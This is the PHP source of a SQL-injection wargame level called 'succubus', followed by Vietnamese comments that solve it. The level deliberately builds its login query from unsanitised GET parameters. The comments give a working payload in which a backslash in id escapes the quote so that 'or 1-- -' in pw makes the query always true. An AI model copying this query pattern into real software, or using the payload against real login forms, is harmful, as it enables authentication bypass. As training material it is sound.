<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/\'/',$_GET[id])) exit("HeHe");
  if(preg_match('/\'/',$_GET[pw])) exit("HeHe");
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("succubus"); 
  highlight_file(__FILE__); 
?>

<!-- NOTES: Bài này lấy vào 2 giá trị từ user đó là id và pw ==> và đã bị filter '

Để solve được bài này thì cần phải cho câu lệnh query thực thi được và đúng , nhưng chúng ta ko biết giá trị id và pw là gì
+) Payload để giải bài này như sau: ?id=\&pw=or 1-- - 
Giải thích: khi id=\ thì khi query sẽ như này id='\' nó sẽ lấy đến giá trị pw=' làm giá trị của thằng id vì \' => là lấy giá trị của của ' và nó chưa đóng ' ==> nên  -->
<!-- câu truy vấn sẽ thực hiện như sau:  -->
<!-- select id from prob_succubus where id='\' and pw='or 1-- -' => câu truy vấn này luôn đúng ==> solved  -->
